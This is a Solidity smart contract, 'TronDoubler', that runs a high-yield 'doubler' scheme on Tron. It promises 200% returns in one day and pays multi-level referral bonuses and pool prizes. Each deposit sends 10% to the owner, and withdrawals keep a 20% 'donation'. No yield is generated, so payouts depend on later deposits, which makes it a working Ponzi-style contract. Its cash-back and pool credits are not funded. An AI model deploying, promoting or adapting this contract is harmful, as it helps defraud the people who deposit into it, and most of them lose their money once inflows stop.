//SourceUnit: TronDoubler200.sol

pragma solidity 0.5.9;

contract TronDoubler {
    using SafeMath for uint256;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        uint256 pool_bonus;
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 last_withdrawal;
        uint256 total_referral_bonus;
        uint256 cash_back;
        PlayerDeposit[] deposits;
        mapping(uint8 => uint256) referrals_per_level;
    }

    address payable owner;

    uint8 investment_days;
    uint256 investment_perc;
    uint256 donation_perc;

    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint8[] referral_bonuses;

    uint256 private _to;

    mapping(address => Player) public players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);


     //=============== Pool ===============
    event PoolPayout(address indexed addr, uint256 amount);
    uint256 public pool_balance;
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint8[] public pool_bonuses;
    uint256 public pool_cycle;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;


    constructor() public {
        owner = msg.sender;

        donation_perc = 20;
        _to = 24 hours;

        investment_days = 1;
        investment_perc = 200;

        referral_bonuses.push(10);
        referral_bonuses.push(7);
        referral_bonuses.push(3);

          //=============== Pool ===============
        pool_bonuses.push(5); //percentage of pool balance
        pool_bonuses.push(3);
        pool_bonuses.push(2);
    }

    function deposit(address _referral) external payable {
        require(msg.value >= 2e7, "Zero amount");
        require(msg.value >= 20000000, "Minimal deposit: 20 TRX");
        Player storage player = players[msg.sender];
        require(player.deposits.length < 1500, "Max 1500 deposits per address");


       if(player.deposits.length == 0){
            player.last_withdrawal = uint256(block.timestamp) + _to;
        }

        _setReferral(msg.sender, _referral);

        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        if(player.total_invested == 0x0){
            total_investors += 1;
        }

        player.total_invested += msg.value;
        total_invested += msg.value;

        _referralPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(10).div(100));

        cash_back(msg.sender,msg.value);

        //==================== poll deposit ===
            _pollDeposits(msg.sender, msg.value);

            if(pool_last_draw + 1 days < block.timestamp) {
                _drawPool();
            }
        //==================== End poll deposit ===


        emit Deposit(msg.sender, msg.value);
    }

        //=================== poll =====================//

     function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount.mul(10).div(100);

        pool_users_refs_deposits_sum[pool_cycle][_addr] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == _addr) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = _addr;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][_addr] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == _addr) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 l = uint8(pool_bonuses.length - 1); l > i; l--) {
                    pool_top[l] = pool_top[l - 1];
                }

                pool_top[i] = _addr;

                break;
            }
        }
    }



      function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount.mul(pool_bonuses[i]).div(100);

            players[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }

        for(uint8 p = 0; p < pool_bonuses.length; p++) {
            pool_top[p] = address(0);
        }
    }
     function poolTopInfo() view external returns(address[3] memory addrs, uint256[3] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    //==================== end poll ==============//



    function cash_back(address _addr, uint256 _amount) private{
        Player storage player = players[_addr];
        uint256 c_back = 0;
        if(_amount > (50000 * 1000000)){
            c_back = _amount.mul(10).div(100);
        }else if(_amount >= (10000 * 1000000)){
            c_back = _amount.mul(5).div(100);
        }

        player.cash_back += c_back;
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;

            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _referralPayout(address _addr, uint256 _amount) private {
         address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        if(upline_player.deposits.length <= 0){
            ref = owner;
        }

        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount.mul(referral_bonuses[i]).div(100);

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        require(uint256(block.timestamp) > player.last_withdrawal,"Countdown still running");

        _payout(msg.sender);


        require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.referral_bonus + player.cash_back + player.pool_bonus;

        player.dividends = 0;
        player.referral_bonus = 0;
        player.cash_back = 0;
        player.pool_bonus = 0;
        player.total_withdrawn += amount;
        total_withdrawn += amount;
        player.last_withdrawal = uint256(block.timestamp) + _to;
        msg.sender.transfer(amount.mul(100 - donation_perc).div(100));

        emit Withdraw(msg.sender, amount);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * investment_perc / investment_days / 8640000;
            }
        }

        return value;
    }

    function contractInfo() view external returns(uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus,uint256 _pool_balance) {
        return (total_invested, total_investors, total_withdrawn, total_referral_bonus,pool_balance);
    }



    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals,uint256 _last_withdrawal,uint256 _cash_back,uint256 _pool_bonus) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);


        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.last_withdrawal,
            player.cash_back,
            player.pool_bonus
        );
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}